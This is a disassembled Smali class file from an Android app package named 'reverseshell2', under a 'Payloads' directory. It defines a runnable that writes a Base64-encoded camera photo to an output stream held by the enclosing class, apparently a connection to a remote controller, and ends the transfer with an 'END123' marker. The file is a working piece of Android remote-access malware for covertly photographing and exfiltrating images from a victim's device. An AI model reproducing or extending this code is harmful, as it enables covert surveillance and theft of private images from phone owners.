.class Lcom/example/reverseshell2/Payloads/CameraPreview$2;
.super Ljava/lang/Object;
.source "CameraPreview.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/CameraPreview;->sendPhoto([B)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

.field final synthetic val$encodedImage:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/CameraPreview;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/CameraPreview;

    .line 76
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$2;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$2;->val$encodedImage:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 80
    const-string v0, "UTF-8"

    :try_start_0
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$2;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/CameraPreview;->access$200(Lcom/example/reverseshell2/Payloads/CameraPreview;)Ljava/io/OutputStream;

    move-result-object v1

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$2;->val$encodedImage:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V

    .line 81
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$2;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/CameraPreview;->access$200(Lcom/example/reverseshell2/Payloads/CameraPreview;)Ljava/io/OutputStream;

    move-result-object v1

    const-string v2, "END123\n"

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 84
    goto :goto_0

    .line 82
    :catch_0
    move-exception v0

    .line 83
    .local v0, "e":Ljava/lang/Exception;
    sget-object v1, Lcom/example/reverseshell2/Payloads/CameraPreview;->TAG:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 85
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method
